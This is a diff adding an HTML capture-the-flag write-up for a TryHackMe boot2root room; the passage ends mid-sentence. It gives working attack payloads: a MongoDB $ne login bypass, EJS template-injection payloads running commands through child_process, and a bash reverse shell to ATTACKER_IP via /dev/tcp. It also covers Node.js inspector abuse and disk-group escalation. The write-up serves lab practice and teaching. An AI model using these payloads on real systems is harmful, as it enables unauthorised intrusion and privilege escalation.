@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Day 7 — Do Not Disturb | Hacker Holidays 2026 Write-Up</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --surface: #1e293b;
+            --border: #334155;
+            --text: #e2e8f0;
+            --text-secondary: #94a3b8;
+            --accent: #38bdf8;
+            --accent-glow: rgba(56, 189, 248, 0.15);
+            --success: #4ade80;
+            --warning: #fbbf24;
+            --danger: #f87171;
+            --code-bg: #0f172a;
+            --inline-code: #1e293b;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 860px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem 4rem;
+        }
+
+        /* Header */
+        .room-header {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 2.5rem 2rem;
+            margin-bottom: 2rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .room-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent), #818cf8, #c084fc);
+        }
+
+        .room-header .emoji-row {
+            font-size: 2rem;
+            margin-bottom: 0.75rem;
+            letter-spacing: 0.25rem;
+        }
+
+        .room-header h1 {
+            font-size: 2.2rem;
+            font-weight: 700;
+            margin-bottom: 0.25rem;
+            color: #fff;
+        }
+
+        .room-header .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.05rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .room-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin-top: 1rem;
+        }
+
+        .room-meta .badge {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.4rem 0.9rem;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+        }
+
+        .room-meta .badge .label {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        /* Sections */
+        section {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 1.75rem;
+        }
+
+        h2 {
+            font-size: 1.45rem;
+            color: #fff;
+            margin-bottom: 1.25rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 2px solid var(--border);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        h2 .step-num {
+            background: var(--accent);
+            color: #0f172a;
+            font-size: 0.9rem;
+            font-weight: 700;
+            width: 28px;
+            height: 28px;
+            border-radius: 7px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        h3 {
+            font-size: 1.15rem;
+            color: var(--accent);
+            margin: 1.5rem 0 0.75rem;
+        }
+
+        p {
+            margin-bottom: 1rem;
+            color: var(--text-secondary);
+        }
+
+        p strong {
+            color: var(--text);
+        }
+
+        /* Code blocks */
+        .code-block {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            margin: 1rem 0 1.5rem;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .code-block .label {
+            background: var(--border);
+            color: var(--text-secondary);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            padding: 0.4rem 1rem;
+            font-weight: 600;
+        }
+
+        .code-block pre {
+            padding: 1.25rem 1.25rem;
+            overflow-x: auto;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+            font-size: 0.875rem;
+            line-height: 1.6;
+            color: #e2e8f0;
+            margin: 0;
+        }
+
+        .code-block .output {
+            background: rgba(251, 191, 36, 0.06);
+            border-top: 1px dashed var(--border);
+            color: var(--warning);
+            padding: 0.9rem 1.25rem;
+            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+            font-size: 0.82rem;
+            white-space: pre-wrap;
+            word-break: break-all;
+        }
+
+        /* Inline code */
+        code:not(pre code) {
+            background: var(--inline-code);
+            border: 1px solid var(--border);
+            border-radius: 5px;
+            padding: 0.15rem 0.45rem;
+            font-size: 0.88em;
+            color: var(--accent);
+            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
+        }
+
+        /* Info callout */
+        .callout {
+            border-left: 4px solid var(--accent);
+            background: var(--accent-glow);
+            border-radius: 0 8px 8px 0;
+            padding: 1rem 1.25rem;
+            margin: 1.25rem 0;
+            font-size: 0.95rem;
+            color: var(--text);
+        }
+
+        .callout.thinking {
+            border-left-color: var(--warning);
+            background: rgba(251, 191, 36, 0.08);
+        }
+
+        .callout.success {
+            border-left-color: var(--success);
+            background: rgba(74, 222, 128, 0.08);
+        }
+
+        .callout strong {
+            color: inherit;
+        }
+
+        /* Flag boxes */
+        .flag-box {
+            background: rgba(74, 222, 128, 0.06);
+            border: 1px solid rgba(74, 222, 128, 0.25);
+            border-radius: 10px;
+            padding: 1.25rem 1.5rem;
+            margin: 1.25rem 0;
+            text-align: center;
+        }
+
+        .flag-box .flag-label {
+            font-size: 0.8rem;
+            text-transform: uppercase;
+            letter-spacing: 0.12em;
+            color: var(--success);
+            font-weight: 700;
+            margin-bottom: 0.4rem;
+        }
+
+        .flag-box .flag-value {
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 1.2rem;
+            color: var(--success);
+            font-weight: 700;
+            word-break: break-all;
+        }
+
+        /* Attack chain diagram */
+        .attack-chain {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+            align-items: center;
+            margin: 1.5rem 0;
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+            font-size: 0.85rem;
+        }
+
+        .attack-chain .node {
+            background: var(--code-bg);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 0.5rem 0.9rem;
+            color: var(--accent);
+            font-weight: 600;
+            white-space: nowrap;
+        }
+
+        .attack-chain .arrow {
+            color: var(--text-secondary);
+            font-size: 1.1rem;
+        }
+
+        .attack-chain .node.flag {
+            border-color: var(--success);
+            color: var(--success);
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 0.85rem;
+            padding: 2rem 0 0;
+            border-top: 1px solid var(--border);
+            margin-top: 2rem;
+        }
+
+        .footer a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .container {
+                padding: 1rem;
+            }
+            .room-header {
+                padding: 1.5rem;
+            }
+            .room-header h1 {
+                font-size: 1.5rem;
+            }
+            section {
+                padding: 1.25rem;
+            }
+            .attack-chain {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+            .attack-chain .arrow {
+                transform: rotate(90deg);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <!-- ========== ROOM HEADER ========== -->
+        <header class="room-header">
+            <div class="emoji-row">🐚 🌴 🥥 🍦 🍹</div>
+            <h1>Do Not Disturb</h1>
+            <p class="subtitle">Hacker Holidays · The Byte Lotus Hotel</p>
+            <div class="room-meta">
+                <div class="badge"><span class="label">Points</span> 90</div>
+                <div class="badge"><span class="label">Category</span> Boot2Root</div>
+                <div class="badge"><span class="label">Difficulty</span> Medium</div>
+                <div class="badge"><span class="label">Platform</span> TryHackMe</div>
+            </div>
+        </header>
+
+        <!-- ========== CONCIERGE BRIEFING ========== -->
+        <section>
+            <h2>🛎️ Concierge Briefing</h2>
+            <blockquote style="border-left: 3px solid var(--accent); padding-left: 1.25rem; color: var(--text-secondary); font-style: italic; margin: 1rem 0;">
+                Sign's on the door. Room's active. You have access you were never given, and so does he.<br><br>
+                The anomalies stop being anomalies: a session goes warm on a sunbed, and a stranger sits down in it, a wallet signs a transaction its owner didn't authorise, a shell on the beach answers back. And it becomes clear that whoever's already inside has been moving for far longer than you have.<br><br>
+                The Byte Lotus poolside platform tracks every cabana, every sunbed, every warm session. Byte Lotus never forgets. Someone is already inside. Follow his footprints in, climb the way he climbed, and recover both flags.
+            </blockquote>
+            <p>This briefing is <strong>not just flavour text</strong>. It contains three critical clues:</p>
+            <ul style="color: var(--text-secondary); padding-left: 1.5rem; margin-bottom: 1rem;">
+                <li><strong>"a wallet signs a transaction its owner didn't authorise"</strong> — hints at authentication bypass, likely NoSQL injection since the app runs on Express (commonly paired with MongoDB)</li>
+                <li><strong>"a shell on the beach answers back"</strong> — we'll get command execution somewhere; think SSTI or RCE via a web interface</li>
+                <li><strong>"Follow his footprints in, climb the way he climbed"</strong> — a previous attacker has already been through this box. Look for leftover artifacts, exposed debug interfaces, and misconfigured permissions</li>
+            </ul>
+        </section>
+
+        <!-- ========== ATTACK CHAIN OVERVIEW ========== -->
+        <section>
+            <h2>⚡ Attack Chain at a Glance</h2>
+            <div class="attack-chain">
+                <span class="node">Nmap Recon</span>
+                <span class="arrow">→</span>
+                <span class="node">NoSQL Injection (Auth Bypass)</span>
+                <span class="arrow">→</span>
+                <span class="node">EJS SSTI → RCE</span>
+                <span class="arrow">→</span>
+                <span class="node">Reverse Shell (poolside)</span>
+                <span class="arrow">→</span>
+                <span class="node">Node.js Debugger (--inspect)</span>
+                <span class="arrow">→</span>
+                <span class="node">Lateral → pipelinesvc</span>
+                <span class="arrow">→</span>
+                <span class="node">disk Group → debugfs</span>
+                <span class="arrow">→</span>
+                <span class="node flag">🏁 Root Flag</span>
+            </div>
+            <p>We start with a web login page, bypass authentication with NoSQL injection, pivot through Server-Side Template Injection (SSTI) in EJS templates, land a reverse shell, exploit an exposed Node.js debugger for lateral movement, and finally abuse <code>disk</code> group membership to read the root filesystem directly.</p>
+        </section>
+
+        <!-- ========== STEP 1: RECON ========== -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance</h2>
+
+            <h3>1.1 Port Scanning</h3>
+            <p>We begin with a standard Nmap scan to discover open services on the target machine. The machine is assigned an IP on the TryHackMe network — we'll use <code>10.113.129.141</code> throughout this write-up. <strong>Your target IP will differ;</strong> substitute accordingly.</p>
+
+            <div class="code-block">
+                <div class="label">Command — Initial Nmap Scan</div>
+                <pre>nmap -sC -sV 10.113.129.141</pre>
+                <div class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH (Ubuntu)
+80/tcp open  http    Node.js (Express middleware)
+|_http-title: Byte Lotus &mdash; Poolside</div>
+            </div>
+            <p><strong>Findings:</strong> Two ports open — SSH on 22 (not immediately useful without credentials) and HTTP on 80 running <strong>Node.js with Express</strong>. The page title confirms we've reached the Byte Lotus poolside platform from the briefing.</p>
+
+            <h3>1.2 Directory Enumeration</h3>
+            <p>We run Gobuster against the web server to discover hidden endpoints:</p>
+
+            <div class="code-block">
+                <div class="label">Command — Gobuster Directory Brute-Force</div>
+                <pre>gobuster dir -u http://10.113.129.141 -w /path/to/common.txt -t 50</pre>
+                <div class="output">/logout               (Status: 302) [--> /]
+/staff                (Status: 403) [Size: 1547]</div>
+            </div>
+            <p><strong>Key finding:</strong> <code>/staff</code> returns <strong>403 Forbidden</strong> — it exists but is protected. This is likely an admin panel or internal dashboard behind authentication. The <code>/logout</code> endpoint suggests there's a login mechanism with sessions.</p>
+
+            <h3>1.3 Technology Stack Fingerprinting</h3>
+            <p>A more focused service scan on port 80 confirms the stack:</p>
+
+            <div class="code-block">
+                <div class="label">Command — Targeted Service Scan</div>
+                <pre>nmap -sCV -p 80 10.113.129.141</pre>
+                <div class="output">80/tcp open  http    Node.js (Express middleware)
+|_http-title: Byte Lotus &mdash; Poolside</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🧠 Attacker's Thought Process:</strong> Express + NoSQL (MongoDB) is an extremely common stack. The login form's placeholder reveals a username. The briefing mentions "a wallet signs a transaction its owner didn't authorise" — this screams <strong>authentication bypass</strong>. MongoDB's query syntax is JavaScript-like objects; if user input isn't sanitised, we can inject query operators like <code>$ne</code> (not equal) or <code>$gt</code> (greater than) to make the login query always return true.
+            </div>
+        </section>
+
+        <!-- ========== STEP 2: NOSQL INJECTION ========== -->
+        <section>
+            <h2><span class="step-num">2</span> NoSQL Injection — Authentication Bypass</h2>
+
+            <h3>2.1 Understanding the Vulnerability</h3>
+            <p>When you submit a login form on an Express + MongoDB application, the backend typically constructs a query like this:</p>
+
+            <div class="code-block">
+                <div class="label">Vulnerable Backend Logic (Simplified)</div>
+                <pre>db.users.findOne({
+    username: req.body.username,
+    password: req.body.password
+})</pre>
+            </div>
+
+            <p>If <code>req.body.password</code> is passed as an <strong>object</strong> instead of a string, MongoDB interprets its keys as query operators. By sending:</p>
+
+            <div class="code-block">
+                <div class="label">Malicious POST Body</div>
+                <pre>username=attendant&password[$ne]=x</pre>
+            </div>
+
+            <p>The query becomes:</p>
+
+            <div class="code-block">
+                <div class="label">Resulting MongoDB Query</div>
+                <pre>db.users.findOne({
+    username: "attendant",
+    password: { "$ne": "x" }
+})</pre>
+            </div>
+
+            <p><code>$ne</code> means <strong>"not equal"</strong>. This query finds a user named "attendant" whose password is <em>not</em> "x" — which will be true for <em>any</em> password except literally "x". MongoDB happily returns the user document, and the application sets a session cookie, believing authentication succeeded.</p>
+
+            <h3>2.2 Execution</h3>
+            <p>We navigate to the login page at <code>http://10.113.129.141/</code>. The placeholder in the username field reveals the username: <strong>attendant</strong>. We enter:</p>
+            <ul style="color: var(--text-secondary); padding-left: 1.5rem; margin-bottom: 1rem;">
+                <li><strong>Username:</strong> <code>attendant</code></li>
+                <li><strong>Password:</strong> <code>password[$ne]=x</code></li>
+            </ul>
+
+            <p>The browser URL-encodes the brackets automatically when submitting via a form. Upon submission, the server responds with a <strong>302 redirect</strong> to <code>/staff</code> and sets a session cookie:</p>
+
+            <div class="code-block">
+                <div class="label">Response Headers</div>
+                <pre>HTTP/1.1 302 Found
+Location: /staff
+Set-Cookie: connect.sid=s%3A3osxiFYKF-AFBJ4Zp1wUoDAS5sMyidQT.H5uoq4TqyLZNfUsJS6dv6FGOCAJce8OZ5fLTlqe6r78; Path=/; HttpOnly</pre>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Authentication bypassed.</strong> We now have a valid <code>connect.sid</code> session cookie belonging to the "attendant" user. The <code>HttpOnly</code> flag prevents JavaScript from reading the cookie (mitigating XSS-based theft), but we can simply set it manually in our browser.
+            </div>
+
+            <h3>2.3 Accessing the Staff Portal</h3>
+            <p>We navigate to <code>/staff</code> and use browser developer tools (or a cookie manager extension) to add the captured cookie:</p>
+            <ul style="color: var(--text-secondary); padding-left: 1.5rem; margin-bottom: 1rem;">
+                <li><strong>Name:</strong> <code>connect.sid</code></li>
+                <li><strong>Value:</strong> <code>s%3A3osxiFYKF-AFBJ4Zp1wUoDAS5sMyidQT.H5uoq4TqyLZNfUsJS6dv6FGOCAJce8OZ5fLTlqe6r78</code></li>
+            </ul>
+
+            <p>The <code>/staff</code> endpoint renders a dashboard: <strong>"Cabana Desk — Signed in as attendant."</strong> There's a template editor with EJS:</p>
+
+            <div class="code-block">
+                <div class="label">Staff Dashboard — EJS Template Editor</div>
+                <pre>Confirmation template (EJS — use &lt;%= guest %&gt; to personalise)
+Dear &lt;%= guest %&gt;, your Byte Lotus cabana is confirmed.</pre>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🧠 Attacker's Thought Process:</strong> EJS (Embedded JavaScript) is a templating engine that executes JavaScript between <code>&lt;% %&gt;</code> tags. The <code>guest</code> parameter is user-controlled through the URL query string (<code>?guest=poolside</code>). If the application passes this directly into the template without sanitisation, we have <strong>Server-Side Template Injection (SSTI)</strong> — a vulnerability that can lead to Remote Code Execution (RCE).
+            </div>
+        </section>
+
+        <!-- ========== STEP 3: SSTI → RCE ========== -->
+        <section>
+            <h2><span class="step-num">3</span> EJS Server-Side Template Injection → RCE</h2>
+
+            <h3>3.1 Confirming SSTI</h3>
+            <p>We first test by passing a simple JavaScript arithmetic expression to the <code>guest</code> parameter. If EJS evaluates it, the result will appear in the rendered output.</p>
+
+            <div class="code-block">
+                <div class="label">SSTI Test Payload</div>
+                <pre>?guest=&lt;%= 7*7 %&gt;</pre>
+            </div>
+            <p>The page renders: <strong>"Dear 49, your Byte Lotus cabana is confirmed."</strong> — SSTI confirmed.</p>
+
+            <h3>3.2 Escalating to Remote Code Execution</h3>
+            <p>EJS provides access to the Node.js <code>process</code> global object through its template context. We can call <code>child_process.execSync()</code> to execute system commands. The <code>&lt;%- %&gt;</code> syntax outputs unescaped raw content (needed for command output).</p>
+
+            <div class="code-block">
+                <div class="label">RCE Payload — Check Current User</div>
+                <pre>?guest=&lt;%- global.process.mainModule.require('child_process').execSync('whoami') %&gt;</pre>
+                <div class="output">Dear poolside, your Byte Lotus cabana is confirmed.</div>
+            </div>
+
+            <p>We are running as the <strong><code>poolside</code></strong> user. We now have command execution on the target.</p>
+
+            <h3>3.3 Retrieving the User Flag</h3>
+            <p>We enumerate the home directory and read the flag:</p>
+
+            <div class="code-block">
+                <div class="label">List Home Directory</div>
+                <pre>?guest=&lt;%- global.process.mainModule.require('child_process').execSync('ls /home/poolside/') %&gt;</pre>
+                <div class="output">Dear user.txt, your Byte Lotus cabana is confirmed.</div>
+            </div>
+
+            <p>The flag file is <code>user.txt</code>. We read it:</p>
+
+            <div class="code-block">
+                <div class="label">Read User Flag</div>
+                <pre>?guest=&lt;%- global.process.mainModule.require('child_process').execSync('cat /home/poolside/user.txt') %&gt;</pre>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">🏖️ User Flag</div>
+                <div class="flag-value">THM{User_flag}</div>
+            </div>
+
+            <p><em>(Actual flag redacted — complete the room yourself to earn it!)</em></p>
+
+            <h3>3.4 Establishing a Reverse Shell</h3>
+            <p>While we could continue using blind RCE through the template, a proper reverse shell gives us an interactive terminal, which is far more efficient for privilege escalation. We set up a Netcat listener on our attack machine and execute a Bash reverse shell payload.</p>
+
+            <div class="code-block">
+                <div class="label">Attack Machine — Netcat Listener</div>
+                <pre>nc -lvnp 4321</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">Reverse Shell Payload (via guest parameter)</div>
+                <pre>?guest=&lt;%- global.process.mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4321 0>&1"') %&gt;</pre>
+            </div>
+
+            <p>A connection is received. We upgrade to a pseudo-TTY for a fully functional shell:</p>
+
+            <div class="code-block">
+                <div class="label">Shell Upgrade</div>
+                <pre>python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Background with Ctrl+Z, then:
+stty raw -echo; fg</pre>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Interactive shell obtained as <code>poolside</code>.</strong> Now we pivot to privilege escalation.
+            </div>
+        </section>
+
+        <!-- ========== STEP 4: NODE.JS DEBUGGER ========== -->
+        <section>
+            <h2><span class="step-num">4</span> Lateral Movement — Node.js Inspector Abuse</h2>
+
+            <h3>4.1 Discovery</h3>
+            <p>During enumeration of the filesystem, we discover an interesting directory: <code>/opt/pipelinesvc/telemetry/</code>. Inside is a Node.js script:</p>
+
+            <div class="code-block">
+                <div class="label">File: /opt/pipelinesvc/telemetry/processor.js</div>
+                <pre>'use strict';
+const os = require('os');
+
+let ticks = 0;
+
+function processBatch() {
+  ticks += 1;
+  const load = os.loadavg()[0].toFixed(2);
+  if (ticks % 12 === 0) {
+    console.log(`[telemetry] ${new Date().toISOString()} batches=${ticks} load=${load}`);
+  }
+}
+
+console.log('lotus-telemetry occupancy processor started');
+setInterval(processBatch, 5000);
+process.stdin.resume();</pre>
+            </div>
+
+            <p>This appears to be a system telemetry service. Let's check if it's actually running and <strong>how</strong> it was launched:</p>
+
+            <div class="code-block">
+                <div class="label">Process Discovery — Two Approaches</div>
+                <pre># Approach 1: Standard ps + grep (MISSES the process!)
+ps aux | grep telemetry
+# Returns nothing useful — grep only matches process NAMES, not script arguments
+
+# Approach 2: pgrep with full command-line matching (CORRECT!)
+pgrep -af 'processor.js|telemetry'</pre>
+                <div class="output">600 /usr/bin/node --inspect=127.0.0.1:9229 processor.js</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🧠 Why did <code>ps aux | grep</code> fail?</strong> <code>grep telemetry</code> looks for the word "telemetry" in the truncated process name column — but the process is just <code>/usr/bin/node</code>. The script name "processor.js" and the path "telemetry" only appear in the <em>full command line</em> (the arguments). <code>pgrep -af</code> (<code>-f</code> for full command, <code>-a</code> for showing it) matches against the <em>entire</em> command string, which is how we caught the critical <code>--inspect</code> flag. This is a common enumeration pitfall — always use <code>pgrep -af</code> when hunting for specific scripts.
+            </div>
+
+            <h3>4.2 Understanding the --inspect Flag</h3>
+            <p>The process was started with:</p>
+            <div class="code-block">
+                <div class="label">Process Command Line</div>
+                <pre>/usr/bin/node --inspect=127.0.0.1:9229 processor.js</pre>
+            </div>
+
+            <p>Node.js's <code>--inspect</code> flag enables the <strong>V8 Inspector Protocol</strong>, which is the same debugging interface used by Chrome DevTools. It opens a WebSocket-based debugger on port 9229. <strong>Anyone who can connect to this port can execute arbitrary JavaScript in the context of the running process.</strong></p>
+
+            <p>The process is bound to <code>127.0.0.1</code> (localhost), so it's only accessible from the box itself — but we already have a shell as <code>poolside</code>, so that's not a barrier.</p>
+
+            <h3>4.3 Connecting to the Debugger</h3>
+            <p>We use Node.js's built-in <code>inspect</code> command to attach to the debugger and drop into a REPL (Read-Eval-Print Loop):</p>
+
+            <div class="code-block">
+                <div class="label">Connecting to the Node.js Inspector</div>
+                <pre>node inspect 127.0.0.1:9229</pre>
+                <div class="output">connecting to 127.0.0.1:9229 ... ok
+debug&gt; repl
+Press Ctrl+C to leave debug repl
+&gt;</div>
+            </div>
+
+            <p>We are now in a JavaScript REPL <strong>inside the running <code>processor.js</code> process</strong>.</p>
+
+            <h3>4.4 Executing Commands in the Debugger Context</h3>
+            <p>Inside the debugger REPL, <code>require</code> is not directly available (it's not a global in the debugger's evaluation context). However, we can access it through <code>process.mainModule.require</code>:</p>
+
+            <div class="code-block">
+                <div class="label">Debugger REPL — Who Are We?</div>
+                <pre>process.mainModule.require('child_process').execSync('whoami').toString()</pre>
+                <div class="output">'pipelinesvc\n'</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Lateral movement achieved.</strong> The telemetry process runs as <strong><code>pipelinesvc</code></strong>, a different (and likely more privileged) user. We now have code execution in that user's context.
+            </div>
+        </section>
+
+        <!-- ========== STEP 5: PRIVESC TO ROOT ========== -->
+        <section>
+            <h2><span class="step-num">5</span> Privilege Escalation — disk Group → debugfs</h2>
+
+            <h3>5.1 Enumerating pipelinesvc's Privileges</h3>
+            <p>Now operating as <code>pipelinesvc</code>, we check group memberships:</p>
+
+            <div class="code-block">
+                <div class="label">Debugger REPL — Group Membership</div>
+                <pre>process.mainModule.require('child_process').execSync('groups pipelinesvc').toString()</pre>
+                <div class="output">'pipelinesvc : pipelinesvc disk\n'</div>
+            </div>
+
+            <p><strong>Critical finding:</strong> <code>pipelinesvc</code> is a member of the <strong><code>disk</code></strong> group. This group has <strong>raw read/write access to block devices</strong> (<code>/dev/sda</code>, <code>/dev/nvme0n1</code>, etc.). This is effectively equivalent to root access because we can bypass the filesystem permission model entirely.</p>
+
+            <h3>5.2 Identifying the Block Device</h3>
+            <p>We need to find the actual block device backing the root filesystem:</p>
+
+            <div class="code-block">
+                <div class="label">Debugger REPL — List Block Devices</div>
+                <pre>process.mainModule.require('child_process').execSync('lsblk').toString()</pre>
+                <div class="output">NAME        MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS
+nvme1n1     259:0    0     1G  0 disk 
+nvme0n1     259:1    0    20G  0 disk 
+└─nvme0n1p1 259:2    0    20G  0 part /</div>
+            </div>
+
+            <p>The root filesystem lives on <code>/dev/nvme0n1p1</code> (partition 1 of the NVMe drive). The raw disk is <code>/dev/nvme0n1</code>.</p>
+
+            <h3>5.3 Attempting to Read the Root Flag — Three Approaches</h3>
+            <p>The root flag is in <code>/root/root.txt</code>. We try three different methods:</p>
+
+            <p><strong>Approach 1 — Direct <code>cat</code> (Fails):</strong></p>
+            <div class="code-block">
+                <div class="label">Attempt 1: Direct File Read</div>
+                <pre>process.mainModule.require('child_process').execSync('cat /root/root.txt 2>/dev/null || echo "direct read failed"').toString()</pre>
+                <div class="output">direct read failed</div>
+            </div>
+            <p><strong>Why it fails:</strong> Although we're in the <code>disk</code> group, the <em>mounted</em> filesystem still enforces standard Unix permissions. The <code>/root</code> directory has permissions <code>drwx------</code> (700), meaning only root can traverse it. The kernel's VFS (Virtual File System) layer checks these permissions on every <code>cat</code> call.</p>
+
+            <p><strong>Approach
